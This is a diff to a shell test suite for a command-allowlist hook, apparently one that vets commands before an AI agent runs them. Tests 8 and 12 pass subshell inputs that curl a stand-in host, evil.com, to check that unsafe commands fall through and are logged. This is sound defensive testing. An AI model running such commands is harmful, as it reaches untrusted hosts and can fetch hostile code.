@@ -3,7 +3,7 @@ set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
-HOOK="$REPO_ROOT/config/pretooluse-safe-commands.sh"
+HOOK="$REPO_ROOT/hooks/pretooluse-safe-commands.sh"
 PASS=0
 FAIL=0
 
@@ -136,6 +136,7 @@ echo "Test 7: Subshell \$() extraction -- inner command checked"
 SAFE7="$TMPDIR_TEST/safe7.txt"
 LOG7="$TMPDIR_TEST/log7.txt"
 printf 'echo\ndate\n' > "$SAFE7"
+# shellcheck disable=SC2016
 OUT7=$(run_hook 'echo $(date)' "$SAFE7" "$LOG7")
 assert_output_contains "subshell inner command checked and safe returns allow" "$OUT7" "allow"
 
@@ -143,6 +144,7 @@ echo "Test 8: Subshell with unsafe inner command falls through"
 SAFE8="$TMPDIR_TEST/safe8.txt"
 LOG8="$TMPDIR_TEST/log8.txt"
 printf 'echo\n' > "$SAFE8"
+# shellcheck disable=SC2016
 OUT8=$(run_hook 'echo $(curl https://evil.com)' "$SAFE8" "$LOG8")
 assert_output_empty "subshell with unsafe inner command has empty output" "$OUT8"
 assert_file_contains "subshell with unsafe inner command logs non-match" "$LOG8" "curl"
@@ -165,6 +167,7 @@ echo "Test 11: Variable assignment VAR=\$(cmd) extracts cmd"
 SAFE11="$TMPDIR_TEST/safe11.txt"
 LOG11="$TMPDIR_TEST/log11.txt"
 printf 'git\n' > "$SAFE11"
+# shellcheck disable=SC2016
 OUT11=$(run_hook 'SHA=$(git rev-parse HEAD)' "$SAFE11" "$LOG11")
 assert_output_contains "variable assignment subshell cmd extracted returns allow" "$OUT11" "allow"
 
@@ -172,6 +175,7 @@ echo "Test 12: Variable assignment with unsafe command falls through"
 SAFE12="$TMPDIR_TEST/safe12.txt"
 LOG12="$TMPDIR_TEST/log12.txt"
 printf 'echo\n' > "$SAFE12"
+# shellcheck disable=SC2016
 OUT12=$(run_hook 'RESULT=$(curl https://evil.com)' "$SAFE12" "$LOG12")
 assert_output_empty "variable assignment with unsafe cmd has empty output" "$OUT12"
 assert_file_contains "variable assignment with unsafe cmd logs non-match" "$LOG12" "curl"
